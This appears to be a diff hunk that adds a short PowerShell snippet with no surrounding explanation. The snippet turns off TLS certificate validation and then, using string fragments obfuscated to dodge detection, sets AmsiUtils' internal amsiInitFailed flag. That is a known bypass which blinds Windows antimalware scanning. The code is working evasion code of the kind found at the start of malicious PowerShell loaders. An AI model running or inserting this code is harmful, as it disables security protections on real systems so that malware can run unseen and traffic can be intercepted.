@@ -1,0 +1,4 @@
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+try{
+[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
+}catch{}
